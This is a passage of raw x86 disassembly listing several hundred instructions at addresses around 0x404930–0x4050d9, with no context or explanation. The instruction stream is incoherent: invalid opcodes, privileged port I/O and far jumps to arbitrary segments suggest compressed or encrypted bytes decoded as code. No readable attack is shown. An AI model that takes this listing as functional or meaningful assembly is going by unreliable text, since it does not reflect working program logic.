  40492d:	xchg   BYTE PTR [esi-0x6e1670a6],al
  404933:	test   eax,0xed45083a
  404938:	jl     0x4048e8
  40493a:	test   DWORD PTR [ebp+0x63],ecx
  40493d:	repz in al,0x0
  404940:	adc    eax,0x118bd4cd
  404945:	jp     0x40490f
  404947:	rol    DWORD PTR [edx],0x41
  40494a:	pop    edi
  40494b:	in     eax,dx
  40494c:	adc    ah,BYTE PTR [eax]
  40494e:	bound  edx,QWORD PTR ds:0xd61341a7
  404954:	outs   dx,BYTE PTR ss:[esi]
  404956:	iret   
  404957:	clc    
  404958:	xchg   edx,eax
  404959:	rcr    BYTE PTR [esi],1
  40495b:	mov    ebp,DWORD PTR [ebx-0x70]
  40495e:	inc    esp
  40495f:	fist   DWORD PTR [edi]
  404961:	cld    
  404962:	shl    dl,0xe7
  404965:	mov    al,0xdb
  404967:	cmp    DWORD PTR [ebp+0x4b4f856f],eax
  40496d:	pop    ecx
  40496e:	scas   al,BYTE PTR es:[edi]
  40496f:	pop    ebp
  404970:	into   
  404971:	out    0xea,eax
  404973:	mov    esp,0xaea7be08
  404978:	dec    ecx
  404979:	test   DWORD PTR [edx],ebp
  40497b:	shr    BYTE PTR es:[eax+ebp*8-0x5f],0x38
  404981:	push   ebp
  404982:	cli    
  404983:	mov    BYTE PTR cs:[eax+0xd],0xc5
  404988:	fiadd  WORD PTR [ecx+0x2c]
  40498b:	call   0x12fe:0x39ca
  404991:	lods   al,BYTE PTR ds:[esi]
  404992:	dec    ebp
  404993:	mov    ebx,0xfd528e15
  404998:	rcr    BYTE PTR [eax],cl
  40499a:	push   ebp
  40499b:	mov    bh,0xbb
  40499d:	daa    
  40499e:	inc    ebx
  40499f:	xor    BYTE PTR [ebx],dl
  4049a1:	outs   dx,BYTE PTR ds:[esi]
  4049a2:	call   0x3cae:0xb39549c2
  4049a9:	mov    esp,0x4170a6eb
  4049ae:	push   edx
  4049af:	push   eax
  4049b0:	lahf   
  4049b1:	not    DWORD PTR [ecx+ebx*4-0x4c7e2938]
  4049b8:	adc    eax,0x3e17651
  4049bd:	or     eax,0xe7b6795b
  4049c2:	aad    0x6e
  4049c4:	pop    esi
  4049c5:	scas   al,BYTE PTR es:[edi]
  4049c6:	inc    eax
  4049c7:	stos   BYTE PTR es:[edi],al
  4049c8:	inc    ebp
  4049c9:	dec    esi
  4049ca:	jne    0x404953
  4049cc:	pop    edx
  4049cd:	clc    
  4049ce:	pop    es
  4049cf:	cmp    eax,0x96698b0d
  4049d4:	cli    
  4049d5:	mov    ebx,0x4fe1e39d
  4049da:	lods   al,BYTE PTR ds:[esi]
  4049db:	cwde   
  4049dc:	lods   eax,DWORD PTR ds:[esi]
  4049dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049de:	sar    DWORD PTR [esi],1
  4049e0:	push   cs
  4049e1:	or     al,0x44
  4049e3:	jle    0x40496d
  4049e5:	mov    edx,0x12690256
  4049ea:	jecxz  0x4049bd
  4049ec:	aam    0x9a
  4049ee:	(bad)  
  4049ef:	xchg   bl,ah
  4049f1:	test   eax,0xde2cf4ce
  4049f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049f7:	push   edx
  4049f8:	xor    esi,esp
  4049fa:	ins    DWORD PTR es:[edi],dx
  4049fb:	inc    edi
  4049fc:	xor    al,0x7b
  4049fe:	in     eax,0x53
  404a00:	pop    ds
  404a01:	push   cs
  404a02:	adc    al,0x89
  404a04:	dec    ebp
  404a05:	repnz and al,0x85
  404a08:	out    dx,al
  404a09:	cmp    edi,DWORD PTR [ebp+0xda349c2]
  404a0f:	push   ss
  404a10:	imul   ecx,DWORD PTR [ebp-0x61f3fd98],0xffffff89
  404a17:	jnp    0x4049c5
  404a19:	shr    BYTE PTR [edx+0x5ee5820b],1
  404a1f:	aad    0x5b
  404a21:	in     eax,0xf5
  404a23:	adc    eax,0x2073698
  404a28:	test   BYTE PTR [edi],0xc9
  404a2b:	xor    DWORD PTR [eax+0x19fdf65c],0x24
  404a32:	(bad)  
  404a33:	push   ds
  404a34:	stc    
  404a35:	or     ebp,esi
  404a37:	imul   edx,DWORD PTR [edi+ebx*8-0x67],0xffffff86
  404a3c:	jge    0x404ab4
  404a3e:	mov    al,ds:0xc2c0677d
  404a43:	ret    0xe459
  404a46:	adc    BYTE PTR [esi],bh
  404a48:	stos   DWORD PTR es:[edi],eax
  404a49:	cmp    ah,bl
  404a4b:	xchg   esp,eax
  404a4c:	mov    ds:0xf7b964ab,eax
  404a51:	or     eax,0x8c507c78
  404a56:	ja     0x404a11
  404a58:	inc    eax
  404a59:	inc    edi
  404a5a:	icebp  
  404a5b:	imul   esp,DWORD PTR [edi-0x2b6eaa8a],0xca696fc2
  404a65:	in     eax,0xbf
  404a67:	outs   dx,DWORD PTR ds:[esi]
  404a68:	stc    
  404a69:	mov    dh,0x8
  404a6b:	stos   DWORD PTR es:[edi],eax
  404a6c:	sub    ah,bl
  404a6e:	mov    eax,0x6476c571
  404a73:	(bad)  
  404a74:	inc    ebp
  404a75:	pusha  
  404a76:	pop    ds
  404a77:	(bad)  
  404a78:	inc    ebx
  404a79:	rcl    DWORD PTR [eax+0x30e1fc17],1
  404a7f:	hlt    
  404a80:	inc    esi
  404a81:	les    ebp,FWORD PTR [edi+0x77e405f0]
  404a87:	in     eax,0x95
  404a89:	xchg   edx,eax
  404a8a:	ficomp DWORD PTR [ecx+0x3f3e3ac0]
  404a90:	test   DWORD PTR [ebx+0x4a094443],eax
  404a96:	and    ch,BYTE PTR [ebx+0x69]
  404a99:	xor    BYTE PTR [ebp-0x5b],ah
  404a9c:	adc    BYTE PTR [esi+0x32],dh
  404a9f:	imul   edi,DWORD PTR [ebp-0x3c],0x43f2d93e
  404aa6:	test   ebp,esi
  404aa8:	loop   0x404ad1
  404aaa:	cs je  0x404a2e
  404aad:	mov    esp,0xf34e4afe
  404ab2:	mov    ds:0x3b7e35d0,al
  404ab7:	sahf   
  404ab8:	bound  ecx,QWORD PTR [esi]
  404aba:	xchg   eax,edx
  404abc:	xchg   edi,eax
  404abd:	dec    ebx
  404abe:	push   cs
  404abf:	adc    al,0x65
  404ac1:	xchg   esp,eax
  404ac2:	icebp  
  404ac3:	jg     0x404ad8
  404ac5:	scas   eax,DWORD PTR es:[edi]
  404ac6:	mov    esi,0xccf55bfd
  404acb:	inc    ebx
  404acc:	inc    esp
  404acd:	aas    
  404ace:	imul   eax,DWORD PTR [esi+edi*8],0x46f8a139
  404ad5:	sbb    ebx,DWORD PTR [edi-0x29]
  404ad8:	push   ecx
  404ad9:	fwait
  404ada:	sub    al,BYTE PTR [edi-0x3f2d00ab]
  404ae0:	jne    0x404a79
  404ae2:	mov    eax,0xaaa431a4
  404ae7:	shr    DWORD PTR [esi],1
  404ae9:	sbb    edx,edx
  404aeb:	xor    al,0xcf
  404aed:	add    dl,BYTE PTR [esi]
  404aef:	cmc    
  404af0:	scas   eax,DWORD PTR es:[edi]
  404af1:	sub    al,0x6e
  404af3:	xor    DWORD PTR [eax+0x2],edi
  404af6:	mov    bl,0x21
  404af8:	push   0x62b91418
  404afd:	sbb    ecx,DWORD PTR [ebp-0x11]
  404b00:	lock test eax,0xfac44faf
  404b06:	cmp    al,0xf9
  404b08:	mov    bh,0xa
  404b0a:	out    dx,al
  404b0b:	mov    ah,0xd1
  404b0d:	dec    esi
  404b0e:	mov    eax,ds:0x36dc0a8f
  404b13:	ss addr16 mov edi,0xa195116
  404b1a:	pop    ds
  404b1b:	shl    BYTE PTR [edx+esi*2],0x9e
  404b1f:	pop    ebp
  404b20:	test   ah,ah
  404b22:	sub    ebp,ecx
  404b24:	add    esp,0x11
  404b27:	dec    edx
  404b28:	mov    edi,0xe5df7676
  404b2d:	fdivr  QWORD PTR [ecx]
  404b2f:	or     ch,BYTE PTR [ebp-0x6c2b4b90]
  404b35:	xlat   BYTE PTR ds:[ebx]
  404b36:	dec    ebp
  404b37:	mov    dl,0x2f
  404b39:	add    al,0xdb
  404b3b:	mov    esp,0x3d0b9604
  404b40:	lods   eax,DWORD PTR ds:[esi]
  404b41:	dec    eax
  404b42:	xor    dl,BYTE PTR [edi+eax*1+0x3b315411]
  404b49:	xchg   edi,eax
  404b4a:	iret   
  404b4b:	sar    DWORD PTR [edx],cl
  404b4d:	pushf  
  404b4e:	sahf   
  404b4f:	and    edx,DWORD PTR [eax-0x62dd6a19]
  404b55:	cmp    al,0xe4
  404b57:	xchg   ebx,eax
  404b58:	push   edx
  404b59:	sbb    BYTE PTR [ebx],al
  404b5b:	mov    ch,0x1c
  404b5d:	sub    DWORD PTR [ecx],esp
  404b5f:	jb     0x404b5c
  404b61:	jmp    0x404b49
  404b63:	cmp    eax,0x108e3d3c
  404b68:	mov    bh,0x37
  404b6a:	dec    eax
  404b6b:	test   BYTE PTR [ebx],dh
  404b6d:	jecxz  0x404bbe
  404b6f:	or     DWORD PTR [edx-0x4e4d1403],esp
  404b75:	lods   eax,DWORD PTR ds:[esi]
  404b76:	mov    edi,0x226991bd
  404b7b:	ret    0xbf8f
  404b7e:	xchg   BYTE PTR [eax+0x53],cl
  404b81:	mov    esp,0xdf6e206c
  404b86:	popa   
  404b87:	test   eax,0x57f65b74
  404b8c:	mov    edx,0xc959453d
  404b91:	call   0xad48:0x11e78e08
  404b98:	mov    ds:0x30253795,al
  404b9d:	pop    ebx
  404b9e:	int    0xd1
  404ba0:	sub    esp,DWORD PTR [ecx-0x65]
  404ba3:	call   FWORD PTR [edi+0x37288b20]
  404ba9:	cmp    al,0xc5
  404bab:	loopne 0x404b61
  404bad:	test   eax,0xfebdec66
  404bb2:	push   cs
  404bb3:	outs   dx,BYTE PTR ds:[esi]
  404bb4:	sub    eax,0x544c4be4
  404bb9:	dec    edx
  404bba:	add    DWORD PTR ds:0xb7b48f35,edx
  404bc0:	imul   eax,DWORD PTR [edi+edi*8],0xe4a72205
  404bc7:	je     0x404b73
  404bc9:	jp     0x404b8f
  404bcb:	mov    fs,esi
  404bcd:	jns    0x404bc7
  404bcf:	pop    ss
  404bd0:	sahf   
  404bd1:	fisttp QWORD PTR ds:0xb066283a
  404bd7:	shr    BYTE PTR [ebx-0x67],cl
  404bda:	repnz pop ebx
  404bdc:	push   0xffffffa6
  404bde:	arpl   WORD PTR [edx-0x20],si
  404be1:	pop    edi
  404be2:	into   
  404be3:	cwde   
  404be4:	sub    BYTE PTR [ebp+ebp*4+0x7c],ah
  404be8:	jmp    0x404b9f
  404bea:	in     al,0x75
  404bec:	test   al,0xea
  404bee:	ss pusha 
  404bf0:	ins    DWORD PTR es:[edi],dx
  404bf1:	sbb    DWORD PTR [esi-0x7f3aa3ca],ecx
  404bf7:	mov    al,ds:0xb95ef5d9
  404bfc:	fimul  DWORD PTR [edi-0xa39ab8a]
  404c02:	inc    ecx
  404c03:	and    dh,bh
  404c05:	push   ds
  404c06:	adc    eax,DWORD PTR [ecx]
  404c08:	and    al,0x17
  404c0a:	mov    bh,0x6f
  404c0c:	lods   eax,DWORD PTR ds:[esi]
  404c0d:	lock (bad) 
  404c0f:	jmp    0x404ba7
  404c11:	sub    ecx,ebp
  404c13:	sbb    al,0x8b
  404c15:	add    eax,0xa6396f33
  404c1a:	je     0x404c77
  404c1c:	push   0xcebd6ef6
  404c21:	ins    BYTE PTR es:[edi],dx
  404c22:	(bad)  
  404c24:	imul   ebp,DWORD PTR [ecx+ebp*2-0x74],0xfffffff1
  404c29:	shr    BYTE PTR [ebx-0x7fed3e93],1
  404c2f:	pushf  
  404c30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c31:	outs   dx,BYTE PTR ds:[esi]
  404c32:	test   al,0x23
  404c34:	bound  ebx,QWORD PTR [esi+ecx*1+0x17]
  404c38:	ins    BYTE PTR es:[edi],dx
  404c39:	and    BYTE PTR [esi+0x210573c7],ch
  404c3f:	jp     0x404ca9
  404c41:	or     bh,BYTE PTR [ebx-0x1d3a5c93]
  404c47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c48:	push   edi
  404c49:	pop    esp
  404c4a:	mov    cl,0xe
  404c4c:	das    
  404c4d:	inc    ebp
  404c4e:	xor    eax,0x2e052ca3
  404c53:	shl    BYTE PTR [ecx-0x65],0x35
  404c57:	sub    al,BYTE PTR [ecx+0x47]
  404c5a:	aas    
  404c5b:	mov    bl,0x32
  404c5d:	xor    eax,0xec4fd7ba
  404c62:	xchg   ecx,eax
  404c63:	mov    bh,ch
  404c65:	je     0x404cd0
  404c67:	test   al,0x7e
  404c69:	fwait
  404c6a:	push   esi
  404c6b:	lock cs mov dh,0x26
  404c6f:	jns    0x404c2e
  404c71:	out    0x14,al
  404c73:	hlt    
  404c74:	fldenv [ebp+eax*1+0xd]
  404c78:	nop
  404c79:	loope  0x404c82
  404c7b:	add    eax,0x35541671
  404c80:	fwait
  404c81:	cmp    BYTE PTR [eax+0x46],dl
  404c84:	xchg   esp,eax
  404c85:	scas   eax,DWORD PTR es:[edi]
  404c86:	mov    edx,0xa6de771d
  404c8b:	(bad)  
  404c8c:	loop   0x404ca8
  404c8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c8f:	stos   BYTE PTR es:[edi],al
  404c90:	mov    edx,0x30598099
  404c95:	dec    ebp
  404c96:	dec    esp
  404c97:	xor    eax,0x7047dfb9
  404c9c:	mov    ah,0xeb
  404c9e:	xlat   BYTE PTR ds:[ebx]
  404c9f:	mov    dh,0xae
  404ca1:	pop    edx
  404ca2:	adc    edx,DWORD PTR gs:[esi]
  404ca5:	out    dx,eax
  404ca6:	dec    esi
  404ca7:	inc    esp
  404ca8:	inc    ebx
  404ca9:	jmp    0xc15c7d07
  404cae:	aam    0x15
  404cb0:	(bad)  
  404cb1:	ror    BYTE PTR [eax-0x1],1
  404cb4:	in     al,dx
  404cb5:	dec    edi
  404cb6:	sub    DWORD PTR ds:0x6243f62,ecx
  404cbc:	stc    
  404cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cbe:	fidiv  DWORD PTR [ebx-0x700a224d]
  404cc4:	into   
  404cc5:	shr    BYTE PTR [ecx+0x6e91eb1e],1
  404ccb:	outs   dx,BYTE PTR ds:[esi]
  404ccc:	add    cl,cl
  404cce:	sub    eax,0xa448ac3e
  404cd3:	rcr    DWORD PTR [ecx+0x6e],0xa3
  404cd7:	inc    ebx
  404cd8:	int3   
  404cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cda:	test   BYTE PTR [ecx-0x19],al
  404cdd:	add    al,0x8c
  404cdf:	or     BYTE PTR [edx-0x18],bh
  404ce2:	ret    0x44bc
  404ce5:	xchg   ebp,eax
  404ce6:	lock or al,0x4c
  404ce9:	and    eax,0x20884256
  404cee:	arpl   bp,bp
  404cf0:	daa    
  404cf1:	shr    DWORD PTR [eax],cl
  404cf3:	mov    bl,0xa8
  404cf5:	call   0x8e4d9b18
  404cfa:	adc    DWORD PTR [edx-0x4bbe4c74],ecx
  404d00:	and    eax,0xcf06e8c0
  404d05:	inc    eax
  404d06:	inc    edi
  404d07:	nop
  404d08:	mov    edi,0x9ca7ac25
  404d0d:	adc    DWORD PTR [eax],ebx
  404d0f:	imul   esp,DWORD PTR [edi+0x36],0xbb470b1b
  404d16:	adc    ah,BYTE PTR [ecx]
  404d18:	popf   
  404d19:	int3   
  404d1a:	call   0xf974:0x6a1225a4
  404d21:	sub    DWORD PTR [ebp+0x65f09c95],0x40
  404d28:	jp     0x404cc3
  404d2a:	loop   0x404cde
  404d2c:	mov    WORD PTR [esi+eiz*8],fs
  404d2f:	mov    edi,0xa021b2d2
  404d34:	(bad)  
  404d35:	push   0x5ffc5457
  404d3a:	pop    eax
  404d3b:	cmp    eax,0xd0e40da0
  404d40:	mov    bl,0x52
  404d42:	adc    esp,DWORD PTR [ebp+0x67]
  404d45:	aad    0x50
  404d47:	gs es sbb bh,ah
  404d4b:	jle    0x404d78
  404d4d:	aam    0xed
  404d4f:	stos   BYTE PTR es:[edi],al
  404d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d51:	and    DWORD PTR [esi],eax
  404d53:	pop    ebx
  404d54:	ret    
  404d55:	sub    eax,DWORD PTR [ebp+0x730bf3ba]
  404d5b:	xor    BYTE PTR [esp+edx*1-0x4e99e1a2],al
  404d62:	sub    dh,bl
  404d64:	aad    0x93
  404d66:	fild   QWORD PTR [edi-0x69e313f4]
  404d6c:	out    dx,al
  404d6d:	enter  0x9a92,0x81
  404d71:	ins    DWORD PTR es:[edi],dx
  404d72:	mov    bh,0x1d
  404d74:	adc    eax,0xcca4f0be
  404d79:	fimul  DWORD PTR [esi-0x1]
  404d7c:	aas    
  404d7d:	adc    eax,0xd47b87c5
  404d82:	and    bl,BYTE PTR [ebp-0x5f19cc73]
  404d88:	aaa    
  404d89:	dec    ecx
  404d8a:	(bad)  
  404d8b:	sbb    bh,ch
  404d8d:	ja     0x404de6
  404d8f:	mov    bl,0x36
  404d91:	xchg   ah,bh
  404d93:	test   eax,0x7995808f
  404d98:	sbb    al,0x84
  404d9a:	inc    ecx
  404d9b:	in     eax,dx
  404d9c:	fnstsw WORD PTR [eax-0x1c3bfa24]
  404da2:	mov    bh,0xab
  404da4:	push   0x4a
  404da6:	sub    BYTE PTR [ebx],al
  404da8:	and    eax,0x6e586e76
  404dad:	mov    eax,0x36624f25
  404db2:	lds    edi,FWORD PTR [edx+0x5c]
  404db5:	adc    BYTE PTR [ebx+0x6f83ad63],ah
  404dbb:	xor    eax,DWORD PTR [eax+esi*2+0x2d]
  404dbf:	mov    gs,WORD PTR [edi-0x64]
  404dc2:	fisttp WORD PTR [ebp-0x6a]
  404dc5:	push   ss
  404dc6:	scas   al,BYTE PTR es:[edi]
  404dc7:	popf   
  404dc8:	xchg   edi,eax
  404dc9:	push   ebp
  404dca:	retf   
  404dcb:	mov    eax,ds:0xe9b2e6eb
  404dd0:	adc    ebx,ebp
  404dd2:	test   DWORD PTR [edi+ebx*2],0xd26dd4f
  404dd9:	aam    0xc6
  404ddb:	ret    
  404ddc:	enter  0xadab,0x6
  404de0:	clc    
  404de1:	pop    ebx
  404de2:	cmp    esp,esi
  404de4:	ja     0x404e31
  404de6:	pusha  
  404de7:	lock add eax,0xd00419f6
  404ded:	(bad)  
  404def:	or     al,0x45
  404df1:	shl    bh,1
  404df3:	cmc    
  404df4:	js     0x404de9
  404df6:	clc    
  404df7:	mov    edi,0xe261e50c
  404dfc:	xchg   ebp,eax
  404dfd:	ss jle 0x404e6b
  404e00:	mov    esi,0xd6f82180
  404e05:	aad    0x26
  404e07:	mov    eax,0xfdf9e2e7
  404e0c:	shld   DWORD PTR [edx-0x49],eax,0xff
  404e11:	xchg   BYTE PTR [ebx+0x29796a11],al
  404e17:	repz add al,0xa0
  404e1a:	cwde   
  404e1b:	push   esp
  404e1c:	sub    ebx,DWORD PTR [eax+0x40809ca7]
  404e22:	push   es
  404e23:	mov    ebx,0x1579c879
  404e28:	nop
  404e29:	repz dec edi
  404e2b:	mov    ebx,0x2780ab4
  404e30:	(bad)  
  404e31:	jbe    0x404e6c
  404e33:	push   eax
  404e34:	in     al,dx
  404e35:	repz or al,0x86
  404e38:	fadd   QWORD PTR [edx]
  404e3a:	pop    es
  404e3b:	jg     0x404df0
  404e3d:	enter  0x1201,0x58
  404e41:	sbb    ebp,0x6e548beb
  404e47:	xchg   BYTE PTR [eax-0x70],ch
  404e4a:	jl     0x404e52
  404e4c:	sub    edi,DWORD PTR [ebp+0xe]
  404e4f:	lahf   
  404e50:	into   
  404e51:	mov    edx,0x51ab1fd8
  404e56:	jl     0x404df1
  404e58:	pop    esi
  404e59:	inc    ecx
  404e5a:	aad    0xfc
  404e5c:	add    al,0x7c
  404e5e:	xchg   edi,eax
  404e5f:	mov    ah,0xa8
  404e61:	mov    al,0x96
  404e63:	mov    dl,0x8c
  404e65:	adc    al,0x2e
  404e67:	mov    ah,dl
  404e69:	retf   0xff25
  404e6c:	fs push ebp
  404e6e:	jne    0x404ec6
  404e70:	xor    DWORD PTR [edx],edi
  404e72:	push   eax
  404e73:	xlat   BYTE PTR ds:[ebx]
  404e74:	jbe    0x404e22
  404e76:	fiadd  DWORD PTR [ebx-0x48]
  404e79:	mov    ebp,0x7ec8adb
  404e7e:	sbb    ah,bl
  404e80:	std    
  404e81:	test   BYTE PTR [ecx+0x6089b9a1],0x34
  404e88:	fadd   QWORD PTR ds:0xf22f3840
  404e8e:	sub    eax,0x841b24f6
  404e93:	imul   ebx,esi,0xaef34da4
  404e99:	mov    cl,0xd5
  404e9b:	jg     0x404e54
  404e9d:	in     al,0xd8
  404e9f:	es mov eax,0xa24e728
  404ea5:	dec    ebp
  404ea6:	pop    ss
  404ea7:	imul   eax,DWORD PTR [edi*4+0x24840e33],0x3e78b016
  404eb2:	push   esp
  404eb3:	ins    DWORD PTR es:[edi],dx
  404eb4:	mov    al,0x1d
  404eb6:	add    al,0x4
  404eb8:	popf   
  404eb9:	jge    0x404ecd
  404ebb:	add    ch,BYTE PTR [eax-0x120a443c]
  404ec1:	test   cl,0x13
  404ec4:	adc    esi,DWORD PTR [ebx]
  404ec6:	xchg   esp,eax
  404ec7:	outs   dx,DWORD PTR ds:[esi]
  404ec8:	retf   
  404ec9:	jmp    ebx
  404ecb:	ja     0x404e51
  404ecd:	jo     0x404e62
  404ecf:	inc    edx
  404ed0:	or     BYTE PTR [edi],0x5b
  404ed3:	and    esp,DWORD PTR [esp+ecx*1]
  404ed6:	fisttp WORD PTR [ecx-0x2d]
  404ed9:	jnp    0x404f39
  404edb:	xchg   edx,eax
  404edc:	ss sbb eax,0xddc18c82
  404ee2:	out    dx,al
  404ee3:	ret    0xb275
  404ee6:	out    0x13,eax
  404ee8:	pushf  
  404ee9:	lods   al,BYTE PTR ds:[esi]
  404eea:	fisttp QWORD PTR [ebx]
  404eec:	retf   
  404eed:	call   DWORD PTR [edi]
  404eef:	inc    ecx
  404ef0:	mov    eax,ds:0x620b6f6e
  404ef5:	outs   dx,DWORD PTR ds:[esi]
  404ef6:	pop    esi
  404ef7:	mov    ds:0x985cfb15,eax
  404efc:	pop    ebx
  404efd:	mov    bh,0x95
  404eff:	cmp    al,0x5c
  404f01:	cmp    edx,DWORD PTR ds:0xbdc83339
  404f07:	lods   al,BYTE PTR ds:[esi]
  404f08:	scas   eax,DWORD PTR es:[edi]
  404f09:	or     esi,edx
  404f0b:	sub    bl,BYTE PTR es:[eax+0x189b8331]
  404f12:	daa    
  404f13:	cmp    al,0xcb
  404f15:	sub    ebx,ebp
  404f17:	sti    
  404f18:	push   ds
  404f19:	leave  
  404f1a:	or     ebp,ebx
  404f1c:	pop    edx
  404f1d:	mov    ebp,es
  404f1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f20:	repnz mov cl,al
  404f23:	xchg   DWORD PTR [ebx],ebx
  404f25:	cmp    DWORD PTR [esp+esi*2+0x13488d04],0x1e12b0a4
  404f30:	fild   DWORD PTR [ebx+0x16]
  404f33:	retf   0x5f31
  404f36:	add    BYTE PTR [ebx+0x5a63cc95],0xd9
  404f3d:	xchg   edi,eax
  404f3e:	jb     0x404f7b
  404f40:	inc    ebp
  404f41:	loop   0x404f46
  404f43:	adc    BYTE PTR ds:0x8034264e,0xc5
  404f4a:	sti    
  404f4b:	push   edi
  404f4c:	ins    DWORD PTR es:[edi],dx
  404f4d:	pop    edx
  404f4e:	dec    edi
  404f4f:	sub    dh,ah
  404f51:	add    eax,0xd38e2b32
  404f56:	sahf   
  404f57:	adc    DWORD PTR [edi],ebp
  404f59:	and    dh,ah
  404f5b:	mov    dh,0xf8
  404f5d:	jle    0x404f3b
  404f5f:	fnstenv [ebx+eiz*1]
  404f62:	gs cmp eax,0x865d95eb
  404f68:	mov    dh,0xe7
  404f6a:	mov    esp,0x987b8e79
  404f6f:	push   cs
  404f70:	sub    BYTE PTR [edi],al
  404f72:	fnstcw WORD PTR [ebx]
  404f74:	jb     0x404f7a
  404f76:	cmp    ecx,DWORD PTR es:[edi]
  404f79:	jno    0x404f53
  404f7b:	dec    ecx
  404f7c:	mov    al,ds:0x20a1156b
  404f81:	pop    ebp
  404f82:	add    eax,0x83faca79
  404f87:	xchg   ebp,eax
  404f88:	cmp    BYTE PTR [ecx],dh
  404f8a:	sbb    BYTE PTR [ebx],ah
  404f8c:	jns    0x404f74
  404f8e:	sub    edx,ebx
  404f90:	in     eax,dx
  404f91:	ret    
  404f92:	xchg   cl,cl
  404f94:	lea    ecx,[edx-0x1f0daa43]
  404f9a:	fadd   DWORD PTR [esi+ebx*4]
  404f9d:	mov    BYTE PTR [edx+eax*2-0x7c],dh
  404fa1:	xchg   edx,eax
  404fa2:	addr16 or bl,ah
  404fa5:	mov    ebp,0x9af429e
  404faa:	sbb    DWORD PTR [ebp+0x6a029076],ebx
  404fb0:	sbb    DWORD PTR [esi],ebp
  404fb2:	jo     0x404fd8
  404fb4:	pop    ds
  404fb5:	cwde   
  404fb6:	outs   dx,BYTE PTR ds:[esi]
  404fb7:	retf   
  404fb8:	pop    ebp
  404fb9:	xchg   cl,cl
  404fbb:	xor    BYTE PTR [edi-0x215cb10f],0xbd
  404fc2:	out    dx,eax
  404fc3:	out    0x80,al
  404fc5:	loop   0x404fc6
  404fc7:	cmp    BYTE PTR [esi+0x1c],al
  404fca:	(bad)  
  404fcb:	scas   eax,DWORD PTR es:[edi]
  404fcc:	cli    
  404fcd:	and    BYTE PTR [ebp+0x73139fc2],0xc2
  404fd4:	add    ch,BYTE PTR [esi+0xfca90ec]
  404fda:	push   edx
  404fdb:	mov    ch,0xd6
  404fdd:	jne    0x40502a
  404fdf:	ret    
  404fe0:	xor    al,0x20
  404fe2:	xchg   ebx,eax
  404fe3:	mov    ds:0x68daeeed,eax
  404fe8:	xchg   ebx,eax
  404fe9:	retf   
  404fea:	clc    
  404feb:	arpl   dx,bx
  404fed:	mov    WORD PTR [eax+0x37],fs
  404ff0:	int3   
  404ff1:	daa    
  404ff2:	xchg   edi,eax
  404ff3:	aaa    
  404ff4:	push   eax
  404ff5:	jae    0x404fee
  404ff7:	addr16 push es
  404ff9:	sbb    esp,DWORD PTR [esi]
  404ffb:	xor    BYTE PTR [ecx],ah
  404ffd:	cmp    BYTE PTR [ebx-0x7f],ch
  405000:	sub    edx,DWORD PTR [ecx+esi*8-0x65]
  405004:	push   0xffffffb8
  405006:	xlat   BYTE PTR ds:[ebx]
  405007:	xor    BYTE PTR [ebx],dh
  405009:	pop    esp
  40500a:	mov    ?,WORD PTR [edi-0x638bb4d9]
  405010:	sub    dh,BYTE PTR [ebp-0x44b4279b]
  405016:	xor    al,0xea
  405018:	jbe    0x404fce
  40501a:	push   ds
  40501b:	fidivr WORD PTR [edi-0x72172274]
  405021:	sub    bh,dh
  405023:	pop    ss
  405024:	out    dx,al
  405025:	sub    edi,DWORD PTR ds:0x61539a37
  40502b:	(bad)  
  40502c:	fmul   DWORD PTR [eax+edx*8]
  40502f:	inc    esp
  405030:	xchg   ecx,eax
  405031:	mov    bl,0x63
  405033:	push   ss
  405034:	xchg   ecx,eax
  405035:	test   BYTE PTR [edi-0xebf7f93],dl
  40503b:	mov    cl,0xae
  40503d:	aam    0x20
  40503f:	loope  0x40503c
  405041:	aas    
  405042:	push   cs
  405043:	xchg   edx,eax
  405044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405045:	push   es
  405046:	stc    
  405047:	push   ebp
  405048:	int3   
  405049:	cmp    al,0x2b
  40504b:	icebp  
  40504c:	cmp    ecx,DWORD PTR [ebx+0x7b]
  40504f:	mov    cl,0xef
  405051:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  405053:	sub    al,0x73
  405055:	xchg   edx,eax
  405056:	pop    edx
  405057:	jge    0x405006
  405059:	xchg   ecx,eax
  40505a:	xchg   edx,eax
  40505b:	xor    cl,BYTE PTR [edi]
  40505d:	sahf   
  40505e:	push   ss
  40505f:	adc    edi,DWORD PTR [ebp-0x4]
  405062:	(bad)  
  405063:	cmp    DWORD PTR cs:[edi+0x6],ecx
  405067:	sti    
  405068:	jns    0x405098
  40506a:	ret    0x6688
  40506d:	es int 0xc9
  405070:	test   eax,0xb0661339
  405075:	daa    
  405076:	jge    0x405005
  405078:	pop    ds
  405079:	push   cs
  40507a:	xchg   esp,eax
  40507b:	or     bl,BYTE PTR [ebx+eax*4]
  40507e:	sbb    bh,BYTE PTR [edx+0x68]
  405081:	push   ecx
  405082:	push   edx
  405083:	mul    DWORD PTR [ebx+0x7f]
  405086:	(bad)  [ebp+0x71]
  405089:	inc    eax
  40508a:	nop
  40508b:	nop
  40508c:	clc    
  40508d:	iret   
  40508e:	xchg   esp,eax
  40508f:	imul   eax,DWORD PTR [esi-0x2a],0xffffffca
  405093:	loopne 0x405114
  405095:	aad    0x5d
  405097:	pop    es
  405098:	(bad)  
  405099:	(bad)  
  40509a:	ja     0x40506c
  40509c:	jne    0x4050dd
  40509e:	adc    DWORD PTR [ecx-0x6c3409f6],0x73c9daa2
  4050a8:	mov    dl,0x1b
  4050aa:	mov    eax,ds:0x37dd386d
  4050af:	aas    
  4050b0:	cmp    DWORD PTR [ebx+edi*2+0x7eb4bdf4],ecx
  4050b7:	test   WORD PTR [ebx],di
  4050ba:	cmp    eax,0xf3e19b06
  4050bf:	jns    0x405124
  4050c1:	jne    0x405120
  4050c3:	xchg   edx,eax
  4050c4:	dec    ebp
  4050c5:	sbb    eax,0x3bcc4bf8
  4050ca:	sub    dl,BYTE PTR ds:0xa1109219
  4050d0:	mov    esi,0x5f5bf746
  4050d5:	addr16 jae 0x40511b
  4050d8:	push   ebp
  4050d9:	inc    edi
